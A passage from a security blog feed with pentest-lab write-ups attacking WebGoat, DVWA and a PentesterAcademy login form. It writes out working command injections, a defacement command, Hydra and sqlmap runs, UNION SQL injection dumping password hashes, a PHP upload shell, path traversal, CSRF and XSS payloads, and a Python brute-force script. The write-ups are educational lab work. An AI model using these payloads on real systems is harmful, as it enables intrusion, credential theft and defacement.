<p>To deface the site, we will exploit a remote code execution vulnerability. We know the name of the file we need for defacing, but we don&rsquo;t know where it&rsquo;s located. By clicking the View Network button and intercepting the request, we can see there is a file parameter involved. And we can inject an additional command: <code>SUBMIT=View+Network&amp;File=tcp;find / -name webgoat_challenge_guest.jsp -print -quit</code>. This will tell find to search for the file starting from the root directory, and quit after the first match, otherwise it would take long. And we can see the results printed on the screen:</p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/deface4.png" title="challenge stage 3" alt="challenge stage 3"></p>

<p>Now that we know where the file is, we can output some text to it to complete the defacement: <code>SUBMIT=View+Network&amp;File=tcp;echo &ldquo;We serve free 0 days!&rdquo; > /root/WebGoat-5.4/tomcat/webapps/WebGoat/webgoat_challenge_guest.jsp</code>.</p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/deface5.png" title="deface" alt="deface"></p>

<p>And, with this, the WebGoat pentest lab is concluded! This was a massive post, and it took me a while. It&rsquo;s been my favorite web application challenge so far, the amount and variety of the exercises was great, and it covered many common vulnerabilities. Can&rsquo;t recommend this enough!</p>

<p>Fortune cookie:</p>

<blockquote><p>You will experience a strong urge to do good; but it will pass.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Damn Vulnerable Web Application]]></title>
    <link href="http://chousensha.github.io/blog/2014/08/08/pentest-lab-damn-vulnerable-web-application/"/>
    <updated>2014-08-08T00:30:24+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/08/08/pentest-lab-damn-vulnerable-web-application</id>
    <content type="html"><![CDATA[<p>It&rsquo;s time for some web hacking in my pentest lab, so in this post I will go over attacking DVWA.</p>

<!-- more -->


<blockquote><p>Damn Vulnerable Web App (DVWA) is a PHP/MySQL web application that is damn
vulnerable. Its main goals are to be an aid for security professionals to test their
skills and tools in a legal environment, help web developers better understand the
processes of securing web applications and aid teachers/students to teach/learn web
application security in a class room environment.</p></blockquote>

<p>Since it&rsquo;s already installed on Metasploitable, I didn&rsquo;t have to install it. The default credentials for logging in are <em>admin: password</em>.</p>

<p>For this lab I will use the low and medium levels of security and PHPIDS disabled. The high security setting represents the secure implementation that aims to eliminate the vulnerabilities.</p>

<h3>Brute Force</h3>

<p><a href="https://www.owasp.org/index.php/Brute_force_attack"><strong>Overview</strong></a></p>

<blockquote><p>A brute force attack can manifest itself in many different ways, but primarily consists in an attacker configuring predetermined
values, making requests to a server using those values, and then analyzing the response. For the sake of efficiency, an attacker may
use a dictionary attack (with or without mutations) or a traditional brute-force attack (with given classes of characters e.g.:
alphanumerical, special, case (in)sensitive). Considering a given method, number of tries, efficiency of the system which conducts the
attack, and estimated efficiency of the system which is attacked the attacker is able to calculate approximately how long it will take
to submit all chosen predetermined values.</p></blockquote>

<p><img class="center" src="http://chousensha.github.io/images/dvwa/bruteforce.png" title="bruteforce" alt="bruteforce"></p>

<p>In the first challenge we have to brute force a login form.</p>

<p>As always, first I used some dummy values to see how is the data transmitted, and it&rsquo;s visible in the URL:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://metasploitable/dvwa/vulnerabilities/brute/?username=test&password=test&Login=Login#</span></code></pre></td></tr></table></div></figure>


<p>I will use Hydra to brute force the form. I created some files with usernames and passwords:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat users.txt
</span><span class='line'>admin
</span><span class='line'>test
</span><span class='line'>administrator
</span><span class='line'>
</span><span class='line'>cat pass.txt
</span><span class='line'>admin
</span><span class='line'>1234
</span><span class='line'>password
</span><span class='line'>letmein
</span><span class='line'>test
</span><span class='line'>password1234</span></code></pre></td></tr></table></div></figure>


<p>I ran Hydra like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>hydra 192.168.127.128 -L ~/Desktop/users.txt -P ~/Desktop/pass.txt http-get-form "/dvwa/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=798cbe3ff31159e5a08aae5a407f81cf"
</span><span class='line'>
</span><span class='line'>Hydra v7.6 (c)2013 by van Hauser/THC & David Maciejak - for legal purposes only
</span><span class='line'>
</span><span class='line'>Hydra (http://www.thc.org/thc-hydra) starting at 2014-08-09 13:05:32
</span><span class='line'>[DATA] 16 tasks, 1 server, 18 login tries (l:3/p:6), ~1 try per task
</span><span class='line'>[DATA] attacking service http-get-form on port 80
</span><span class='line'>[80][www-form] host: 192.168.127.128   login: admin   password: password
</span><span class='line'>1 of 1 target successfully completed, 1 valid password found
</span><span class='line'>Hydra (http://www.thc.org/thc-hydra) finished at 2014-08-09 13:05:33</span></code></pre></td></tr></table></div></figure>


<p>And we have cracked it!</p>

<h3>Command Execution</h3>

<p><a href="https://www.owasp.org/index.php/Command_Injection"><strong>Overview</strong></a></p>

<blockquote><p>Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable
application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers
etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of
the vulnerable application. Command injection attacks are possible largely due to insufficient input validation.</p></blockquote>

<p><img class="center" src="http://chousensha.github.io/images/dvwa/rce.png" title="code execution" alt="remote code execution"></p>

<p>On this page we can ping an arbitrary IP address. We can run arbitrary code by typing <code>;whoami</code>, which will tell us the server is running as the <em>www-data</em> user. The semicolon is a way to stack commands in Linux, so here we use it to end the previous command (which was the ping functionality), and we insert a new command of our choosing to be run by the vulnerable server.</p>

<p>On medium, the same results can be achieved by entering <code>||whoami</code> instead.</p>

<p>The difference between the operators is that <code>;</code> runs both commands irrespective of the first command&rsquo;s status, whereas <code>||</code> executes the second command only if the previous one failed.</p>

<h3>CSRF</h3>

<p><a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29"><strong>Overview</strong></a></p>

<blockquote><p>CSRF is an attack which forces an end user to execute unwanted actions on a web application in which he/she is currently authenticated.
With a little help of social engineering (like sending a link via email/chat), an attacker may trick the users of a web application
into executing actions of the attacker&rsquo;s choosing. A successful CSRF exploit can compromise end user data and operation in case of
normal user. If the targeted end user is the administrator account, this can compromise the entire web application.</p></blockquote>

<p><img class="center" src="http://chousensha.github.io/images/dvwa/csrf.png" title="csrf" alt="csrf"></p>

<p>We see here that we can change the admin password. When we submit the new password, we see the request looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://metasploitable/dvwa/vulnerabilities/csrf/?password_new=newpass&password_conf=newpass&Change=Change#</span></code></pre></td></tr></table></div></figure>


<p>We can exploit this behavior to change anyone&rsquo;s password as long as they are logged in to the application, by tricking the user to perform the request. The exact method may differ, but an example would be to use the image tag to make the request behind the scenes. Of course, this could be achieved by manipulating HTML in other ways too, with a link, iframe, script, etc.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;img src="http://metasploitable/dvwa/vulnerabilities/csrf/?password_new=newpass&password_conf=newpass&Change=Change#"&gt;</span></code></pre></td></tr></table></div></figure>


<h3>File Inclusion</h3>

<p><a href="https://www.owasp.org/index.php/OWASP_Periodic_Table_of_Vulnerabilities_-_Remote_File_Inclusion"><strong>Overview</strong></a></p>

<blockquote><p>The application loads data from an attacker-controlled resource at runtime, enabling a variety of malicious activities. Either the
source address or the resource itself (or both) may be under the attacker&rsquo;s control.</p></blockquote>

<p><img class="center" src="http://chousensha.github.io/images/dvwa/include.png" title="file inclusion" alt="include file"></p>

<p>The file inclusion is pretty straightforward:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.127.128/dvwa/vulnerabilities/fi/?page=../../../../../../../../../etc/passwd</span></code></pre></td></tr></table></div></figure>


<h3>SQL Injection</h3>

<p><a href="https://www.owasp.org/index.php/SQL_Injection"><strong>Overview</strong></a></p>

<blockquote><p>A SQL injection attack consists of insertion or &ldquo;injection&rdquo; of a SQL query via the input data from the client to the application. A
successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute
administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file
system and in some cases issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL
commands are injected into data-plane input in order to effect the execution of predefined SQL commands.</p></blockquote>

<p><img class="center" src="http://chousensha.github.io/images/dvwa/sqli.png" title="sqli" alt="sqli"></p>

<p>The vulnerability is straightforward. On low security, injecting <code>&lsquo;or 1=1&mdash; </code> returns all records:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ID: 'or 1=1-- 
</span><span class='line'>First name: admin
</span><span class='line'>Surname: admin
</span><span class='line'>
</span><span class='line'>ID: 'or 1=1-- 
</span><span class='line'>First name: Gordon
</span><span class='line'>Surname: Brown
</span><span class='line'>
</span><span class='line'>ID: 'or 1=1-- 
</span><span class='line'>First name: Hack
</span><span class='line'>Surname: Me
</span><span class='line'>
</span><span class='line'>ID: 'or 1=1-- 
</span><span class='line'>First name: Pablo
</span><span class='line'>Surname: Picasso
</span><span class='line'>
</span><span class='line'>ID: 'or 1=1-- 
</span><span class='line'>First name: Bob
</span><span class='line'>Surname: Smith</span></code></pre></td></tr></table></div></figure>


<p>The <em>id</em> parameter is vulnerable, as expected. From here we can proceed in different ways, fingerprinting the host, retrieving more information, etc. I will settle for getting the password hashes for the users we have discovered.</p>

<p><strong>Discover the number of colums</strong></p>

<p><code>&lsquo;union select 1,2&mdash; </code></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ID: 'union select 1,2-- 
</span><span class='line'>First name: 1
</span><span class='line'>Surname: 2</span></code></pre></td></tr></table></div></figure>


<p><strong>Get database name</strong></p>

<p><code>&lsquo;union select database(),2&mdash; </code></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ID: 'union select database(),2-- 
</span><span class='line'>First name: dvwa
</span><span class='line'>Surname: 2</span></code></pre></td></tr></table></div></figure>


<p><strong>Get table names for the current database</strong></p>

<p><code>&lsquo;union select table_name,2 from information_schema.tables where table_schema=database()&mdash; </code></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ID: 'union select table_name,2 from information_schema.tables where table_schema=database()-- 
</span><span class='line'>First name: guestbook
</span><span class='line'>Surname: 2
</span><span class='line'>
</span><span class='line'>ID: 'union select table_name,2 from information_schema.tables where table_schema=database()-- 
</span><span class='line'>First name: users
</span><span class='line'>Surname: 2</span></code></pre></td></tr></table></div></figure>


<p><strong>Get column names for the users table</strong></p>

<p><code>&lsquo;union select column_name, 2 from information_schema.columns where table_name='users&rsquo;&mdash;  </code></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ID: 'union select column_name, 2 from information_schema.columns where table_name='users'--  
</span><span class='line'>First name: user_id
</span><span class='line'>Surname: 2
</span><span class='line'>
</span><span class='line'>ID: 'union select column_name, 2 from information_schema.columns where table_name='users'--  
</span><span class='line'>First name: first_name
</span><span class='line'>Surname: 2
</span><span class='line'>
</span><span class='line'>ID: 'union select column_name, 2 from information_schema.columns where table_name='users'--  
</span><span class='line'>First name: last_name
</span><span class='line'>Surname: 2
</span><span class='line'>
</span><span class='line'>ID: 'union select column_name, 2 from information_schema.columns where table_name='users'--  
</span><span class='line'>First name: user
</span><span class='line'>Surname: 2
</span><span class='line'>
</span><span class='line'>ID: 'union select column_name, 2 from information_schema.columns where table_name='users'--  
</span><span class='line'>First name: password
</span><span class='line'>Surname: 2
</span><span class='line'>
</span><span class='line'>ID: 'union select column_name, 2 from information_schema.columns where table_name='users'--  
</span><span class='line'>First name: avatar
</span><span class='line'>Surname: 2</span></code></pre></td></tr></table></div></figure>


<p><strong>Get password hashes</strong></p>

<p><code>&lsquo;union select user, password from users&mdash; </code></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ID: ' union select user, password from users-- 
</span><span class='line'>First name: admin
</span><span class='line'>Surname: 5f4dcc3b5aa765d61d8327deb882cf99
</span><span class='line'>
</span><span class='line'>ID: ' union select user, password from users-- 
</span><span class='line'>First name: gordonb
</span><span class='line'>Surname: e99a18c428cb38d5f260853678922e03
</span><span class='line'>
</span><span class='line'>ID: ' union select user, password from users-- 
</span><span class='line'>First name: 1337
</span><span class='line'>Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
</span><span class='line'>
</span><span class='line'>ID: ' union select user, password from users-- 
</span><span class='line'>First name: pablo
</span><span class='line'>Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
</span><span class='line'>
</span><span class='line'>ID: ' union select user, password from users-- 
</span><span class='line'>First name: smithy
</span><span class='line'>Surname: 5f4dcc3b5aa765d61d8327deb882cf99</span></code></pre></td></tr></table></div></figure>


<p>On medium security, the injection query only differs in using an integer instead of a quote: <code>99 or 1=1&mdash; </code>.</p>

<h3>SQL Injection (Blind)</h3>

<p><a href="https://www.owasp.org/index.php/Blind_SQL_Injection"><strong>Overview</strong></a></p>

<blockquote><p>Blind SQL (Structured Query Language) injection is a type of SQL Injection attack that asks the database true or false questions and
determines the answer based on the applications response. This attack is often used when the web application is configured to show
generic error messages, but has not mitigated the code that is vulnerable to SQL injection.</p>

<p>When an attacker exploits SQL injection, sometimes the web application displays error messages from the database complaining that the
SQL Query&rsquo;s syntax is incorrect. Blind SQL injection is nearly identical to normal SQL Injection, the only difference being the way the
data is retrieved from the database. When the database does not output data to the web page, an attacker is forced to steal data by
asking the database a series of true or false questions. This makes exploiting the SQL Injection vulnerability more difficult, but not
impossible.</p></blockquote>

<p>Since this is more or less identical to the previous SQL injection, I will instead use sqlmap against it, so I don&rsquo;t have to repeat the same queries:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u "http://192.168.127.128/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=cd855d2bfb73dfe22ef2f11a475fa9e6" --dbms=MySQL --dump</span></code></pre></td></tr></table></div></figure>


<h3>Upload</h3>

<p><a href="https://www.owasp.org/index.php/Unrestricted_File_Upload"><strong>Overview</strong></a></p>

<blockquote><p>Uploaded files represent a significant risk to applications. The first step in many attacks is to get some code to the system to be
attacked. Then the attack only needs to find a way to get the code executed. Using a file upload helps the attacker accomplish the
first step.</p>

<p>The consequences of unrestricted file upload can vary, including complete system takeover, an overloaded file system or database,
forwarding attacks to back-end systems, and simple defacement. It depends on what the application does with the uploaded file and
especially where it is stored.</p></blockquote>

<p><img class="center" src="http://chousensha.github.io/images/dvwa/upload.png" title="file upload" alt="upload"></p>

<p>I am going to upload a PHP file that runs the command <em>uname -a</em>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$cmd</span> <span class="o">=</span> <span class="nb">system</span><span class="p">(</span><span class="s1">&#39;uname -a&#39;</span><span class="p">);</span>
</span><span class='line'><span class="k">echo</span> <span class="nv">$cmd</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>After uploading the file, the path where we can find it is conveniently provided:</p>

<p><em>../../hackable/uploads/upload.php succesfully uploaded!</em></p>

<p>Navigate to the file to see the command output:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>192.168.127.128/dvwa/vulnerabilities/upload/../../hackable/uploads/upload.php</span></code></pre></td></tr></table></div></figure>


<p>On medium security, the code checks if the file is a jpeg image and under a certain size:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="k">if</span> <span class="p">((</span><span class="nv">$uploaded_type</span> <span class="o">==</span> <span class="s2">&quot;image/jpeg&quot;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$uploaded_size</span> <span class="o">&lt;</span> <span class="mi">100000</span><span class="p">))</span>
</span></code></pre></td></tr></table></div></figure>


<p>However, this can be easily bypassed by intercepting the request and modifying the filename. Here is what I had in Live HTTP Headers:</p>

<p><code>Content-Disposition: form-data; name=&ldquo;uploaded&rdquo;; filename=&ldquo;upload.php%00.jpg&rdquo;</code></p>

<p>And I modified it to:</p>

<p><code>Content-Disposition: form-data; name=&ldquo;uploaded&rdquo;; filename=&ldquo;upload.php&rdquo;\r\n</code></p>

<h3>XSS reflected</h3>

<p><a href="https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29#Reflected_XSS_Attacks"><strong>Overview</strong></a></p>

<blockquote><p>Reflected attacks are those where the injected script is reflected off the web server, such as in an error message, search result, or
any other response that includes some or all of the input sent to the server as part of the request. Reflected attacks are delivered to
victims via another route, such as in an e-mail message, or on some other web site. When a user is tricked into clicking on a malicious
link, submitting a specially crafted form, or even just browsing to a malicious site, the injected code travels to the vulnerable web
site, which reflects the attack back to the user’s browser. The browser then executes the code because it came from a &ldquo;trusted&rdquo; server.
Reflected XSS is also sometimes referred to as Non-Persistent or Type-II XSS.</p></blockquote>

<p><img class="center" src="http://chousensha.github.io/images/dvwa/xss_reflected.png" title="reflected xss" alt="reflected xss"></p>

<p>Low security:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Medium security:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;SCRIPT&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span><span class="nt">&lt;/SCRIPT&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<h3>XSS stored</h3>

<p><a href="https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29#Stored_XSS_Attacks"><strong>Overview</strong></a></p>

<blockquote><p>Stored attacks are those where the injected script is permanently stored on the target servers, such as in a database, in a message
forum, visitor log, comment field, etc. The victim then retrieves the malicious script from the server when it requests the stored
information. Stored XSS is also sometimes referred to as Persistent or Type-I XSS.</p></blockquote>

<p><img class="center" src="http://chousensha.github.io/images/dvwa/xss_stored.png" title="stored xss" alt="stored xss"></p>

<p>The vulnerable field is the name box. The XSS strings that I used on the reflected XSS page work for this one as well, the only difference is that I had to use Firebug to modify the maximum length from 10 to an arbitrary higher value.</p>

<p>As you can see, DVWA was..damn vulnerable!</p>

<blockquote><p>Cheer Up!  Things are getting worse at a slower rate.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[PentesterAcademy WAP Challenge 1: Form Bruteforcing]]></title>
    <link href="http://chousensha.github.io/blog/2014/07/27/pentesteracademy-wap-challenge-1-form-bruteforcing/"/>
    <updated>2014-07-27T00:31:26+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/07/27/pentesteracademy-wap-challenge-1-form-bruteforcing</id>
    <content type="html"><![CDATA[<p><a href="http://www.pentesteracademy.com">PentesterAcademy</a> has a section dedicated to web application security challenges. In this post I will present my solution to the first challenge, which requires form bruteforcing to authenticate on the provided web page:</p>

<p><a href="http://pentesteracademylab.appspot.com/lab/webapp/1">http://pentesteracademylab.appspot.com/lab/webapp/1</a></p>

<!-- more -->


<p>This is how the page looks like:</p>

<p><img class="center" src="http://chousensha.github.io/images/wap1.png" title="wap1" alt="wap1"></p>

<p>The provided hint should help with writing a bruteforce script:</p>

<p><strong>Hint:</strong></p>

<p><strong>Company Domain: PentesterAcademy.com</strong></p>

<p><strong>Usernames: jack, admin</strong></p>

<p><strong>Password Complexity: 5 characters and uses only x,y,z lowercase. Password examples &ndash; xxyyz, xyzxy, xyxxx etc.</strong></p>

<p>So, what we need here is to test the login with usernames of the form <em>user@companydomain</em> and 5 character passwords constructed from the given characters.</p>

<p>I wrote a Python script to do that:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">requests</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">itertools</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="n">url</span> <span class="o">=</span> <span class="s">&#39;http://pentesteracademylab.appspot.com/lab/webapp/1&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="n">emails</span> <span class="o">=</span> <span class="p">[</span><span class="s">&#39;jack@pentesteracademy.com&#39;</span><span class="p">,</span> \
</span><span class='line'>          <span class="s">&#39;admin@pentesteracademy.com&#39;</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">buildPassList</span><span class="p">(</span><span class="n">iterables</span><span class="p">,</span> <span class="n">r</span><span class="p">):</span>
</span><span class='line'>    <span class="n">passlist</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">word</span> <span class="ow">in</span> <span class="n">itertools</span><span class="o">.</span><span class="n">product</span><span class="p">(</span><span class="n">iterables</span><span class="p">,</span> <span class="n">repeat</span> <span class="o">=</span> <span class="n">r</span><span class="p">):</span>
</span><span class='line'>        <span class="n">passlist</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">word</span><span class="p">))</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">passlist</span>
</span><span class='line'>
</span><span class='line'><span class="n">passlist</span> <span class="o">=</span> <span class="n">buildPassList</span><span class="p">(</span><span class="s">&#39;xyz&#39;</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'><span class="n">fail</span> <span class="o">=</span> <span class="s">&#39;Failed! Please try again!&#39;</span>
</span><span class='line'><span class="k">for</span> <span class="n">user</span> <span class="ow">in</span> <span class="n">emails</span><span class="p">:</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">passwd</span> <span class="ow">in</span> <span class="n">passlist</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&#39;Try </span><span class="si">%d</span><span class="s"> - email: </span><span class="si">%s</span><span class="s"> password: </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">count</span><span class="p">,</span> <span class="n">user</span><span class="p">,</span> <span class="n">passwd</span><span class="p">)</span>
</span><span class='line'>        <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;email&#39;</span><span class="p">:</span> <span class="n">user</span><span class="p">,</span> <span class="s">&#39;password&#39;</span><span class="p">:</span> <span class="n">passwd</span><span class="p">}</span>
</span><span class='line'>        <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'>        <span class="k">if</span> <span class="n">fail</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">req</span><span class="o">.</span><span class="n">content</span><span class="p">:</span>
</span><span class='line'>            <span class="k">print</span> <span class="n">payload</span>
</span><span class='line'>            <span class="k">print</span> <span class="n">req</span><span class="o">.</span><span class="n">content</span>
</span><span class='line'>            <span class="k">break</span>
</span><span class='line'>        <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
</span></code></pre></td></tr></table></div></figure>


<p>I used the requests module, which is very handy for all sorts of URL interaction. To figure out the parameter names and how are they passed to the login form, I tested with some garbage values and saw the URL looked like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://pentesteracademylab.appspot.com/lab/webapp/1?email=test&password=xyz</span></code></pre></td></tr></table></div></figure>


